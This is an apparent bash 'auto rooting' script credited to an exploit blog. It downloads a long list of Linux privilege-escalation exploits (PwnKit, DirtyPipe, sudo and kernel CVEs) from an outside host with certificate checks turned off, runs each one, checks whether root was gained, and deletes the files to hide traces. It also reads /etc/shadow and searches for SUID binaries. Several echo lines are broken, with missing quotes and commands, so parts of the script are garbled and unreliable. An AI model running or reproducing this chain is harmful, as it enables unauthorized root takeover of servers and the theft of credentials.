#!/bin/bash

RED='\033[91m'
ENDCOLOR='\033[0m'

************************************************************"
echo -e "${RED}Auto Rooting Server By: pecho -e "${RED}Blog:  https://www.xploit.info${ENDCOLOR}"
************************************************************"

check_root() {
    if [ $(id -u) -eq 0 ]; then
        echo
        Successfully Get Root Access"
        ID     => $(id -u)"
        WHOAMI => $USER"
        echo
        exit
    fi
}

check_pkexec_version() {
    output=$(pkexec --version)
    version=""
    while IFS= read -r line; do
        if [[ $line == "pkexec version"* ]]; then
            version="${line##* }"
            break
        fi
    done <<< "$output"
    $version"
}

run_commands_with_pkexec() {
    pkexec_version=$(check_pkexec_version)
    pkexec version: $pkexec_version"

    if [[ $pkexec_version == "0.105" || $pkexec_version == "0.96" || 
$pkexec_version == "0.95" || $pkexec_version == "0.096" ]]; then
        wget -q "https://0-gram.github.io/id-0/exp_file_credential" --no-check-certificate
        chmod 777 "exp_file_credential"
        ./exp_file_credential
        check_root
        rm -f "exp_file_credential"
        rm -rf "exp_dir"
    else
        pkexec ora supported"
    fi
}

run_commands_with_pkexec

wget -q "https://0-gram.github.io/id-0/ak" --no-check-certificate
chmod 777 "ak"
./ak
check_root
rm -f "ak"
rm -rf "GCONV_PATH=."
rm -rf ".pkexec"

wget -q "https://0-gram.github.io/id-0/exploit_userspec.py" --no-check-certificate
chmod 777 "exploit_userspec.py"
python exploit_userspec.py
check_root
rm -f "exploit_userspec.py"
rm -f "0"
rm -f "kmem"
rm -f "sendfile1"

wget -q 
"https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/a2.out" --no-check-certificate
chmod 777 "a2.out"
find / -perm 4000 -type -f 2>/dev/null || find / -perm -u=s -type -f 
2>/dev/null
./a2.out /usr/bin/sudo
check_root
./a2.out /usr/bin/passwd
check_root
rm -f "a2.out"

wget -q --no-check-certificate  https://0-gram.github.io/id-0/sudodirtypipe
chmod 777 sudodirtypipe
./sudodirtypipe /usr/local/bin
check_root
rm sudodirtypipe

wget -q --no-check-certificate  https://0-gram.github.io/id-0/af_packet
chmod 777 af_packet
./af_packet
check_root
rm af_packet

wget -q --no-check-certificate  https://0-gram.github.io/id-0/CVE-2015-1328
chmod 777 CVE-2015-1328
./CVE-2015-1328
check_root
rm CVE-2015-1328

wget -q --no-check-certificate  https://0-gram.github.io/id-0/CVE-2016-9793
chmod 777 CVE-2016-9793
./CVE-2016-9793
check_root
rm CVE-2016-9793

wget -q --no-check-certificate  https://0-gram.github.io/id-0/ptrace
chmod 777 ptrace
./ptrace
check_root
rm ptrace

wget -q --no-check-certificate  https://0-gram.github.io/id-0/cve-2017-16995
chmod 777 cve-2017-16995
./cve-2017-16995
check_root
rm cve-2017-16995

wget -q --no-check-certificate  https://0-gram.github.io/id-0/exploit-debian
chmod 777 exploit-debian
./exploit-debian
check_root
rm exploit-debian

wget -q --no-check-certificate  https://0-gram.github.io/id-0/exploit-ubuntu
chmod 777 exploit-ubuntu
./exploit-ubuntu
check_root
rm exploit-ubuntu

wget -q --no-check-certificate  https://0-gram.github.io/id-0/newpid
chmod 777 newpid
./newpid
check_root
rm newpid

wget -q --no-check-certificate  https://0-gram.github.io/id-0/raceabrt
chmod 777 raceabrt
./raceabrt
check_root
rm raceabrt

wget -q --no-check-certificate  https://0-gram.github.io/id-0/timeoutpwn
chmod 777 timeoutpwn
./timeoutpwn
check_root
rm timeoutpwn

wget -q --no-check-certificate  https://0-gram.github.io/id-0/upstream44
chmod 777 upstream44
./upstream44
check_root
rm upstream44

wget -q --no-check-certificate  https://0-gram.github.io/id-0/lpe.sh
chmod 777 lpe.sh
head -2 /etc/shadow
./lpe.sh
check_root
rm lpe.sh

wget -q --no-check-certificate  https://0-gram.github.io/id-0/a.out
chmod 777 a.out
./a.out 0 && ./a.out 1
check_root
rm a.out

wget -q --no-check-certificate  https://0-gram.github.io/id-0/linux_sudo_cve-2017-1000367
chmod 777 linux_sudo_cve-2017-1000367
./linux_sudo_cve-2017-1000367
check_root
rm linux_sudo_cve-2017-1000367

wget -q --no-check-certificate  https://0-gram.github.io/id-0/overlayfs
chmod 777 overlayfs
./overlayfs
check_root
rm overlayfs

wget -q --no-check-certificate  https://0-gram.github.io/id-0/CVE-2017-7308
chmod 777 CVE-2017-7308
./CVE-2017-7308
check_root
rm CVE-2017-7308

wget -q --no-check-certificate  https://0-gram.github.io/id-0/CVE-2022-2639
chmod 777 CVE-2022-2639
./CVE-2022-2639
check_root
rm CVE-2022-2639

wget -q --no-check-certificate  https://0-gram.github.io/id-0/polkit-pwnage
chmod 777 polkit-pwnage
./polkit-pwnage
check_root
rm polkit-pwnage

wget -q --no-check-certificate  https://0-gram.github.io/id-0/RationalLove
chmod 777 RationalLove
./RationalLove
check_root
rm RationalLove

